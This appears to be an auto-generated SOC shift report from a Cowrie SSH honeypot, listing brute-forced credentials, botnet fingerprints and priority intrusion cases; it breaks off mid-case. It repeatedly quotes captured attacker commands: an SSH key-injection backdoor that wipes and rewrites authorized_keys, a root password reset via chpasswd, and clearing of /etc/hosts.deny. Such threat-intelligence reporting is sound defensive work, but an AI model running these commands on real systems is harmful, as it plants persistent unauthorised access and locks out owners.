# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-22 |
| **Generated At** | 2026-06-22T12:11:51Z |
| **Shift Time** | 12:11 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **273** |
| Confirmed Threats | **195** |
| False Positives Filtered | **78** (28.6%) |
| Unique Attacker IPs | **58** |
| Countries of Origin | **18** |
| High Severity Cases | **34** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **239** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **98** |
| Unique Credential Pairs | **69** |
| Unique Usernames | **43** |
| Unique Passwords | **62** |
| Successful Auth Pairs | **23** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 34 |
| `345gs5662d34` | 15 |
| `admin` | 7 |
| `ubuntu` | 2 |
| `supervisor` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 16 |
| `345gs5662d34` | 15 |
| `123456` | 5 |
| `12345678` | 2 |
| `admin` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 16 |
| `345gs5662d34` | `345gs5662d34` | 15 |
| `tp` | `tp` | 1 |
| `odoo` | `odoo16` | 1 |
| `root` | `1234ASDF` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1234ASDF` | `172.174.46.118` | 2026-06-22T05:00:40 |
| `root` | `3245gs5662d34` | `172.174.46.118` | 2026-06-22T05:00:59 |
| `root` | `123@Root` | `172.174.46.118` | 2026-06-22T05:05:09 |
| `root` | `31415926` | `172.174.46.118` | 2026-06-22T05:25:31 |
| `root` | `12qw34er` | `172.174.46.118` | 2026-06-22T05:30:15 |
| `root` | `mexico` | `172.174.46.118` | 2026-06-22T05:34:59 |
| `root` | `Afra@123` | `172.174.46.118` | 2026-06-22T05:49:34 |
| `root` | `Welcome@2026` | `45.164.39.253` | 2026-06-22T05:55:27 |
| `root` | `3245gs5662d34` | `45.164.39.253` | 2026-06-22T05:55:35 |
| `root` | `abc112233` | `122.176.122.24` | 2026-06-22T06:01:33 |
| `root` | `3245gs5662d34` | `122.176.122.24` | 2026-06-22T06:01:35 |
| `root` | `1234Zxcv` | `122.176.122.24` | 2026-06-22T06:08:39 |
| `root` | `testtesttest` | `172.174.46.118` | 2026-06-22T06:17:24 |
| `root` | `ubuntu2026` | `122.176.122.24` | 2026-06-22T06:31:46 |
| `root` | `cloud@2026` | `122.176.122.24` | 2026-06-22T06:38:40 |
| `root` | `$RFV3edc` | `31.22.10.193` | 2026-06-22T06:43:53 |
| `root` | `3245gs5662d34` | `31.22.10.193` | 2026-06-22T06:43:57 |
| `root` | `woaini1314.` | `122.177.242.181` | 2026-06-22T06:45:39 |
| `root` | `3245gs5662d34` | `122.177.242.181` | 2026-06-22T06:45:41 |
| `root` | `123Qwer123` | `122.176.122.24` | 2026-06-22T06:54:52 |
| `root` | `zaq1xsw2` | `122.176.122.24` | 2026-06-22T06:59:31 |
| `root` | `ubuntu` | `103.186.31.247` | 2026-06-22T08:46:52 |
| `root` | `Qaz123` | `114.220.238.224` | 2026-06-22T09:12:59 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **273** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 103 |
| OpenSSH | 10 |
| Go SSH scanner | 5 |
| Unknown | 2 |
| Paramiko (Python) | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 82 | 5 |
| `acaa53e0a7d7...` | Mirai/variant | 9 | 9 |
| `03a80b21afa8...` | Modern SSH client | 6 | 3 |
| `16443846184e...` | Generic scanner | 2 | 2 |
| `19532158b559...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 82 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 12 | 4 | — |
| `acaa53e0a7d7...` | OpenSSH | 9 | 9 | Mirai/variant |
| `03a80b21afa8...` | libssh | 6 | 3 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `19532158b559...` | libssh | 2 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `d6729b7f2442...` | Paramiko (Python) | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 16 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:4qbBsypkBJAg"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `114.220.238.224`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `31.22.10.193`, `122.176.122.24`, `122.177.242.181`, `172.174.46.118`, `45.164.39.253`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **58** |
| Unique ASNs | **39** |
| High-Risk ASNs | **29** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 5 | MEDIUM |
| `AS8075` | Microsoft Corporation | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 3 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS36352` | HostPapa | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (34)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9153e2fd8a30

| Field | Detail |
|---|---|
| **Source IP** | `172.174.46[.]118` |
| **First Seen** | 2026-06-22 05:00 |
| **Last Seen** | 2026-06-22 05:01 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 05:00:32` | `cowrie.session.connect` |
| `2026-06-22 05:00:33` | `cowrie.client.version` |
| `2026-06-22 05:00:33` | `cowrie.client.kex` |
| `2026-06-22 05:00:40` | `cowrie.login.success` |
| `2026-06-22 05:00:43` | `cowrie.session.params` |
| `2026-06-22 05:00:43` | `cowrie.command.input` |
| `2026-06-22 05:00:43` | `cowrie.command.failed` |
| `2026-06-22 05:00:46` | `cowrie.log.closed` |
| `2026-06-22 05:00:48` | `cowrie.session.params` |
| `2026-06-22 05:00:48` | `cowrie.command.input` |
| `2026-06-22 05:00:49` | `cowrie.session.file_download` |
| `2026-06-22 05:00:49` | `cowrie.log.closed` |
| `2026-06-22 05:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.46[.]118` to AbuseIPDB if not already reported
- [ ] Block `172.174.46[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c96d79d62948

| Field | Detail |
|---|---|
| **Source IP** | `172.174.46[.]118` |
| **First Seen** | 2026-06-22 05:00 |
| **Last Seen** | 2026-06-22 05:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 05:00:56` | `cowrie.session.connect` |
| `2026-06-22 05:00:56` | `cowrie.client.version` |
| `2026-06-22 05:00:56` | `cowrie.client.kex` |
| `2026-06-22 05:00:59` | `cowrie.login.success` |
| `2026-06-22 05:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.46[.]118` to AbuseIPDB if not already reported
- [ ] Block `172.174.46[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0269d48ba200

| Field | Detail |
|---|---|
| **Source IP** | `172.174.46[.]118` |
| **First Seen** | 2026-06-22 05:05 |
| **Last Seen** | 2026-06-22 05:05 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 05:05:06` | `cowrie.session.connect` |
| `2026-06-22 05:05:06` | `cowrie.client.version` |
| `2026-06-22 05:05:06` | `cowrie.client.kex` |
| `2026-06-22 05:05:09` | `cowrie.login.success` |
| `2026-06-22 05:05:14` | `cowrie.session.params` |
| `2026-06-22 05:05:14` | `cowrie.command.input` |
| `2026-06-22 05:05:14` | `cowrie.command.failed` |
| `2026-06-22 05:05:15` | `cowrie.log.closed` |
| `2026-06-22 05:05:16` | `cowrie.session.params` |
| `2026-06-22 05:05:16` | `cowrie.command.input` |
| `2026-06-22 05:05:16` | `cowrie.session.file_download` |
| `2026-06-22 05:05:16` | `cowrie.log.closed` |
| `2026-06-22 05:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.46[.]118` to AbuseIPDB if not already reported
- [ ] Block `172.174.46[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1205887c9082

| Field | Detail |
|---|---|
| **Source IP** | `172.174.46[.]118` |
| **First Seen** | 2026-06-22 05:05 |
| **Last Seen** | 2026-06-22 05:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 05:05:27` | `cowrie.session.connect` |
| `2026-06-22 05:05:27` | `cowrie.client.version` |
| `2026-06-22 05:05:28` | `cowrie.client.kex` |
| `2026-06-22 05:05:30` | `cowrie.login.success` |
| `2026-06-22 05:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.46[.]118` to AbuseIPDB if not already reported
- [ ] Block `172.174.46[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e357ab0b9b75

| Field | Detail |
|---|---|
| **Source IP** | `172.174.46[.]118` |
| **First Seen** | 2026-06-22 05:25 |
| **Last Seen** | 2026-06-22 05:25 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 05:25:26` | `cowrie.session.connect` |
| `2026-06-22 05:25:26` | `cowrie.client.version` |
| `2026-06-22 05:25:26` | `cowrie.client.kex` |
| `2026-06-22 05:25:31` | `cowrie.login.success` |
| `2026-06-22 05:25:33` | `cowrie.session.params` |
| `2026-06-22 05:25:33` | `cowrie.command.input` |
| `2026-06-22 05:25:33` | `cowrie.command.failed` |
| `2026-06-22 05:25:33` | `cowrie.log.closed` |
| `2026-06-22 05:25:34` | `cowrie.session.params` |
| `2026-06-22 05:25:34` | `cowrie.command.input` |
| `2026-06-22 05:25:34` | `cowrie.session.file_download` |
| `2026-06-22 05:25:34` | `cowrie.log.closed` |
| `2026-06-22 05:25:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.46[.]118` to AbuseIPDB if not already reported
- [ ] Block `172.174.46[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c7489448d25

| Field | Detail |
|---|---|
| **Source IP** | `172.174.46[.]118` |
| **First Seen** | 2026-06-22 05:25 |
| **Last Seen** | 2026-06-22 05:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 05:25:43` | `cowrie.session.connect` |
| `2026-06-22 05:25:44` | `cowrie.client.version` |
| `2026-06-22 05:25:45` | `cowrie.client.kex` |
| `2026-06-22 05:25:47` | `cowrie.login.success` |
| `2026-06-22 05:25:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.46[.]118` to AbuseIPDB if not already reported
- [ ] Block `172.174.46[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a42f4710380

| Field | Detail |
|---|---|
| **Source IP** | `172.174.46[.]118` |
| **First Seen** | 2026-06-22 05:30 |
| **Last Seen** | 2026-06-22 05:30 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 05:30:11` | `cowrie.session.connect` |
| `2026-06-22 05:30:12` | `cowrie.client.version` |
| `2026-06-22 05:30:12` | `cowrie.client.kex` |
| `2026-06-22 05:30:15` | `cowrie.login.success` |
| `2026-06-22 05:30:17` | `cowrie.session.params` |
| `2026-06-22 05:30:17` | `cowrie.command.input` |
| `2026-06-22 05:30:17` | `cowrie.command.failed` |
| `2026-06-22 05:30:21` | `cowrie.log.closed` |
| `2026-06-22 05:30:22` | `cowrie.session.params` |
| `2026-06-22 05:30:22` | `cowrie.command.input` |
| `2026-06-22 05:30:23` | `cowrie.session.file_download` |
| `2026-06-22 05:30:23` | `cowrie.log.closed` |
| `2026-06-22 05:30:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.46[.]118` to AbuseIPDB if not already reported
- [ ] Block `172.174.46[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2b4fb21debc

| Field | Detail |
|---|---|
| **Source IP** | `172.174.46[.]118` |
| **First Seen** | 2026-06-22 05:30 |
| **Last Seen** | 2026-06-22 05:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 05:30:33` | `cowrie.session.connect` |
| `2026-06-22 05:30:33` | `cowrie.client.version` |
| `2026-06-22 05:30:35` | `cowrie.client.kex` |
| `2026-06-22 05:30:36` | `cowrie.login.success` |
| `2026-06-22 05:30:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.46[.]118` to AbuseIPDB if not already reported
- [ ] Block `172.174.46[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46a6c8890bf9

| Field | Detail |
|---|---|
| **Source IP** | `172.174.46[.]118` |
| **First Seen** | 2026-06-22 05:34 |
| **Last Seen** | 2026-06-22 05:35 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 05:34:54` | `cowrie.session.connect` |
| `2026-06-22 05:34:56` | `cowrie.client.version` |
| `2026-06-22 05:34:57` | `cowrie.client.kex` |
| `2026-06-22 05:34:59` | `cowrie.login.success` |
| `2026-06-22 05:35:01` | `cowrie.session.params` |
| `2026-06-22 05:35:01` | `cowrie.command.input` |
| `2026-06-22 05:35:01` | `cowrie.command.failed` |
| `2026-06-22 05:35:02` | `cowrie.log.closed` |
| `2026-06-22 05:35:02` | `cowrie.session.params` |
| `2026-06-22 05:35:02` | `cowrie.command.input` |
| `2026-06-22 05:35:04` | `cowrie.session.file_download` |
| `2026-06-22 05:35:04` | `cowrie.log.closed` |
| `2026-06-22 05:35:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.46[.]118` to AbuseIPDB if not already reported
- [ ] Block `172.174.46[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faf2ee8133b2

| Field | Detail |
|---|---|
| **Source IP** | `172.174.46[.]118` |
| **First Seen** | 2026-06-22 05:35 |
| **Last Seen** | 2026-06-22 05:35 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 05:35:15` | `cowrie.session.connect` |
| `2026-06-22 05:35:15` | `cowrie.client.version` |
| `2026-06-22 05:35:16` | `cowrie.client.kex` |
| `2026-06-22 05:35:24` | `cowrie.login.success` |
| `2026-06-22 05:35:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.46[.]118` to AbuseIPDB if not already reported
- [ ] Block `172.174.46[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e7623b57ec4

| Field | Detail |
|---|---|
| **Source IP** | `172.174.46[.]118` |
| **First Seen** | 2026-06-22 05:49 |
| **Last Seen** | 2026-06-22 05:49 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 05:49:33` | `cowrie.session.connect` |
| `2026-06-22 05:49:33` | `cowrie.client.version` |
| `2026-06-22 05:49:33` | `cowrie.client.kex` |
| `2026-06-22 05:49:34` | `cowrie.login.success` |
| `2026-06-22 05:49:35` | `cowrie.session.params` |
| `2026-06-22 05:49:35` | `cowrie.command.input` |
| `2026-06-22 05:49:35` | `cowrie.command.failed` |
| `2026-06-22 05:49:40` | `cowrie.log.closed` |
| `2026-06-22 05:49:43` | `cowrie.session.params` |
| `2026-06-22 05:49:43` | `cowrie.command.input` |
| `2026-06-22 05:49:44` | `cowrie.session.file_download` |
| `2026-06-22 05:49:44` | `cowrie.log.closed` |
| `2026-06-22 05:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.46[.]118` to AbuseIPDB if not already reported
- [ ] Block `172.174.46[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac993f518524

| Field | Detail |
|---|---|
| **Source IP** | `172.174.46[.]118` |
| **First Seen** | 2026-06-22 05:49 |
| **Last Seen** | 2026-06-22 05:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 05:49:54` | `cowrie.session.connect` |
| `2026-06-22 05:49:54` | `cowrie.client.version` |
| `2026-06-22 05:49:54` | `cowrie.client.kex` |
| `2026-06-22 05:49:55` | `cowrie.login.success` |
| `2026-06-22 05:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
